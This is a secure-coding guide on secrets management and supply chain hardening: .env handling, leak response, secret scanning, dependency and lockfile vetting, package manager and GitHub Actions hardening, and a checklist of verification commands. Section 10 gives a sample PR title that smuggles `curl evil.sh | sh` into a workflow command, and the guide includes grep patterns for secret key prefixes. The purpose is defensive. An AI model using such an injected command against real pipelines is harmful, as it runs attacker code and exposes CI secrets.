# Secrets and the software supply chain

Read when: adding an API key, env var, credential or signing key; adding, updating or removing a dependency; touching a lockfile, CI workflow, Dockerfile, or publish step.

Sources: OWASP Secrets Management cheat sheet, OWASP Top 10 2025 A03 (Software Supply Chain Failures) and A08, GitHub Actions security hardening guide, npm provenance docs, pnpm supply chain security docs, cargo-deny docs, GitHub dependency-review-action README.

## Contents

1. Secrets: where they live
2. Secrets: what never to do
3. Client bundles are public
4. When a secret leaks
5. Secret scanning
6. Dependencies: choosing and adding
7. Lockfiles and installs
8. JavaScript package manager hardening
9. Rust: cargo-deny, cargo-audit, cargo-vet
10. CI/CD hardening (GitHub Actions)
11. Publishing your own packages
12. Checks

## 1. Secrets: where they live

- Local development: a git-ignored `.env` (or `.env.local`), with a committed `.env.example` listing every variable name and a fake value. The app fails at startup with a clear message if a required secret is missing (validate env with a schema: `zod` / `t3-env` / `envy` + serde).
- Production: the platform's secret store (Vercel/Netlify/Fly/Railway env settings, Supabase Vault, AWS Secrets Manager or SSM, GCP Secret Manager, Doppler, 1Password, Infisical). OWASP prefers mounted files or in-memory retrieval over environment variables, because env vars are visible to all processes and leak into crash dumps and logs; on PaaS platforms env vars are the practical default, so keep them out of logs and error reports.
- CI: the CI secret store, scoped to the jobs and environments that need them; prefer OIDC federation to cloud providers over long-lived cloud keys (GitHub hardening guide).
- Separate secrets per environment. Development and preview never get production keys; production keys are readable by few people (OWASP: engineers should not have access to all secrets).
- Prefer short-lived, scoped credentials: OIDC to the cloud, per-service database roles, restricted API keys (Stripe restricted keys, GitHub fine-grained tokens with an expiry).
- Inventory: every secret has an owner, a purpose, and a rotation procedure. Rotate on staff departures and on any suspicion.

## 2. Secrets: what never to do

- Never commit secrets: not in code, not in config files, not in tests, not in notebooks, not in Docker `ENV`/`ARG` (they persist in image layers; use BuildKit `--mount=type=secret`).
- Never log them. Redact `authorization`, `cookie`, `set-cookie`, `x-api-key`, `password`, `token`, `secret` keys in the logger. Never log full request headers or env.
- Never put them in URLs (logged by proxies and browsers).
- Never send them to the client, including in error messages or debug endpoints.
- Never wrap a secret in JSON or base64 in CI output: masking matches exact strings only (GitHub).
- Never paste production secrets into an LLM chat, issue, or PR description.
- Never generate keys with `Math.random()` or a time seed. Use `crypto.randomBytes(32)` / `crypto.getRandomValues`, Rust `rand::rngs::OsRng` or `getrandom`.

## 3. Client bundles are public

Anything shipped to a browser or a mobile app is public, obfuscated or not.

- Env vars with `NEXT_PUBLIC_`, `VITE_`, `EXPO_PUBLIC_`, `PUBLIC_` (SvelteKit), `REACT_APP_` prefixes are inlined into the bundle. Only publishable values go there: Supabase anon or publishable key (`sb_publishable_...`, safe only because RLS is on), Stripe publishable key, public analytics IDs.
- Never in the client: Supabase `service_role` or `sb_secret_` keys, Stripe secret keys, OpenAI or Anthropic API keys, database URLs, webhook secrets, JWT signing secrets.
- A mobile app needing a third party API that requires a secret calls your backend, which holds the secret and enforces limits per user.
- Check the built output, not only the source: `rg -n "sk_live\|sb_secret_\|service_role\|sk-ant-\|sk-proj-" .next/static dist build`.

## 4. When a secret leaks

Order (OWASP Secrets Management incident response):

1. Revoke the leaked secret immediately at the provider. Rotation first, cleanup later. A secret pushed to a public repo is scraped by bots within minutes.
2. Issue a replacement and deploy it.
3. Check the provider's logs for use of the old secret since the leak.
4. Remove it from code, history (`git filter-repo`), CI logs, and wherever else it appeared. Rewriting history does not un-leak it (forks, clones, caches), which is why step 1 is first.
5. Add a scanner rule or pre-commit hook so it does not happen again.

## 5. Secret scanning

- Enable GitHub secret scanning and push protection on every repo (free for public repos, part of GitHub Advanced Security / Secret Protection for private ones).
- Pre-commit: `gitleaks git --pre-commit --redact --staged --verbose` (the official pre-commit hook entry; gitleaks before 8.19 used `gitleaks protect --staged`), wired through the `pre-commit` framework or a git hook.
- Full history audit once per repo: `gitleaks git -v` or `trufflehog git file://. --results=verified,unknown`.
- Use prefixed key formats for your own secrets (`myapp_sk_live_...`) so scanners can match them.

## 6. Dependencies: choosing and adding

OWASP Top 10 2025 moved supply chain to A03. Malicious package versions (the 2025 Shai-Hulud worm spread through compromised maintainer accounts, stole tokens and republished itself), typosquats, and abandoned packages are now the main risk, more than old CVEs.

Before adding a dependency:

- Is it needed? A few lines of standard library code beat a package for trivial helpers (left-pad class). The platform may already have it (`fetch`, `structuredClone`, `crypto.randomUUID`, `Intl`, `URL`, Rust std).
- Check the exact name (typosquats: `reqeusts`, `cross-env.js`), the repository link, maintainers, weekly downloads, last release date, open security issues, and install scripts (`npm view <pkg> scripts`).
- Prefer packages with provenance (npm shows "Built and signed on GitHub Actions"), few transitive dependencies, and an active maintainer.
- Pin the version range you mean; review what a new version adds (`npm diff --diff=pkg@1.2.3 --diff=pkg@1.2.4`, `cargo vet diff`).
- Remove dependencies you no longer use (`knip`, `depcheck`, `cargo machete`, `cargo udeps`).

## 7. Lockfiles and installs

- Commit the lockfile (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `bun.lock`, `Cargo.lock` for binaries and apps). One package manager per repo; delete other lockfiles.
- CI installs from the lockfile without changing it: `npm ci`, `pnpm install --frozen-lockfile`, `yarn install --immutable`, `bun install --frozen-lockfile`, `cargo build --locked`.
- Review lockfile diffs in PRs: new packages, changed `resolved` URLs (a registry other than the expected one), git or tarball sources. `lockfile-lint --path package-lock.json --allowed-hosts npm --validate-https` automates part of it.
- Automate updates (Dependabot or Renovate) with grouped PRs, a cooldown (Renovate `minimumReleaseAge`, Dependabot `cooldown`), and CI that must pass before merge.

## 8. JavaScript package manager hardening

- Release age cooldown: refuse versions published less than a few days ago; most malicious versions are found and pulled within hours to days.
  - pnpm: `minimumReleaseAge` in `pnpm-workspace.yaml`, in minutes. Default 1440 (1 day) in recent pnpm; set `10080` for a week.
  - npm 11.10+: `min-release-age` in `.npmrc`, in days, off by default. Cannot be combined with `before`.
- Lifecycle scripts (`postinstall`) are the main payload vector:
  - pnpm 10+ does not run dependency build scripts unless allowed: keep `allowBuilds` (older pnpm 10: `onlyBuiltDependencies`) to the few packages that need native builds; keep `strictDepBuilds` on.
  - npm: `ignore-scripts=true` in `.npmrc`, and run needed builds explicitly (`npm rebuild <pkg>`).
- pnpm `blockExoticSubdeps` (on by default) stops transitive dependencies resolving from git URLs or tarballs; `trustPolicy: no-downgrade` blocks a version whose trust evidence dropped (lost trusted publisher or provenance), a signal of account takeover.
- Verify registry signatures and provenance: `npm audit signatures`.
- Known vulnerabilities: `npm audit --omit=dev --audit-level=high` (or `pnpm audit --prod`) in CI; fix or document exceptions. Most dev-only advisories are noise; production ones are not.

## 9. Rust: cargo-deny, cargo-audit, cargo-vet

- `cargo deny init` then `cargo deny check` in CI (EmbarkStudios/cargo-deny-action). It checks:
  - `advisories`: RustSec advisories, unmaintained and yanked crates.
  - `bans`: denied crates and duplicate versions (`multiple-versions = "warn"`).
  - `licenses`: an allowlist of SPDX licenses.
  - `sources`: only crates.io, unknown registries and git sources denied (`unknown-registry = "deny"`, `unknown-git = "deny"`).
- `cargo audit` is the lighter advisory-only check.
- `cargo vet` for teams that review third party code: records audits and imports trusted audit sets (Mozilla, Google, Bytecode Alliance).
- `build.rs` and proc macros run code at build time like npm install scripts; review them when adding crates.
- `cargo install --locked` for tools, so their lockfile is respected.

## 10. CI/CD hardening (GitHub Actions)

From the GitHub security hardening guide:

- Pin third party actions to a full commit SHA (`uses: actions/checkout@<40-char sha> # v4.2.2`), not a tag; tags can be moved by whoever compromises the action. Renovate and Dependabot can update SHAs.
- Set `permissions:` at the top of every workflow, default `contents: read`, and grant more per job only where needed.
- Never interpolate untrusted input into `run:` scripts. `${{ github.event.pull_request.title }}`, issue bodies, branch names and commit messages are attacker controlled. Pass them via `env:` and quote the variable.

```yaml
# bad: a PR titled `"; curl evil.sh | sh; #` runs on your runner
- run: echo "${{ github.event.pull_request.title }}"
# good
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

- Avoid `pull_request_target` and `workflow_run` unless needed; never check out and run PR code in them (they have secrets and a write token).
- Use OIDC (`id-token: write`) to get short-lived cloud credentials instead of stored keys.
- Do not use self-hosted runners for public repos.
- Protect `.github/workflows/` with CODEOWNERS.
- Add `actions/dependency-review-action` on pull requests (`fail-on-severity: high`, `allow-licenses` list) to block vulnerable or disallowed new dependencies. Public repos, or private with GitHub Advanced Security.
- Audit workflows with `zizmor` (static analysis for GitHub Actions) or `actionlint`.
- Never `curl ... | sh` an installer without a pinned version and checksum.

## 11. Publishing your own packages

- Publish from CI, not a laptop, with npm trusted publishing (OIDC, no long-lived npm token) which also generates provenance; otherwise `npm publish --provenance` with `id-token: write`.
- Enable 2FA on registry accounts (npm, crates.io via GitHub) and use granular, expiring tokens.
- Ship only what you mean: `files` allowlist in `package.json`, check with `npm pack --dry-run`; crates: `include` in `Cargo.toml`, check with `cargo package --list`. A stray `.env` in a published tarball is a leak.

## 12. Checks

| Check | Pass condition | How to verify |
|---|---|---|
| No secrets in repo | scanner finds nothing | `gitleaks git -v` or `trufflehog git file://. --results=verified` |
| `.env` ignored, example committed | `.env*` in `.gitignore` except `.env.example` | `git check-ignore .env && test -f .env.example` |
| No server secrets in client env | no secret-looking values behind public prefixes | `rg -n "(NEXT_PUBLIC\|VITE\|EXPO_PUBLIC\|REACT_APP\|PUBLIC)_[A-Z_]*(SECRET\|SERVICE\|PRIVATE\|SK\b\|API_KEY)" ` |
| No secrets in build output | built client has no secret prefixes | `rg -n "sk_live\|sb_secret_\|service_role\|sk-ant-\|sk-proj-\|-----BEGIN" dist .next/static build` |
| Secure randomness | tokens and keys from a CSPRNG | `rg -n "Math\.random\(\)" ` near token, id, code, secret, otp |
| Lockfile committed, one manager | exactly one lockfile at the root | `ls package-lock.json pnpm-lock.yaml yarn.lock bun.lock 2>/dev/null` |
| Frozen installs in CI | CI uses `npm ci` / `--frozen-lockfile` / `--locked` | `rg -n "npm install\|pnpm install\|cargo build" .github/workflows` and check flags |
| Install scripts controlled | pnpm `allowBuilds` short, or npm `ignore-scripts=true` | read `pnpm-workspace.yaml` / `.npmrc` |
| Release age gate | pnpm `minimumReleaseAge` or npm `min-release-age` set | read config |
| Audit clean | no high or critical production advisories | `npm audit --omit=dev --audit-level=high`; `cargo deny check` |
| Signatures verified | `npm audit signatures` passes | run it |
| Actions pinned | every `uses:` of a third party action is a 40-char SHA | `rg -n "uses: [^@]+@(v?[0-9]\|main\|master)" .github/workflows` |
| Workflow permissions | each workflow declares `permissions:` | `rg -L "permissions:" .github/workflows/*.yml` lists files without it |
| No script injection | no `${{ github.event.* }}` inside `run:` | `rg -n "run:.*\$\{\{ *github\.event\." .github/workflows`; `zizmor .github/workflows` |
| No dangerous triggers | `pull_request_target` absent or does not check out PR head | `rg -n "pull_request_target" .github/workflows` |
| Package contents | published tarball has no secrets or tests | `npm pack --dry-run`; `cargo package --list` |
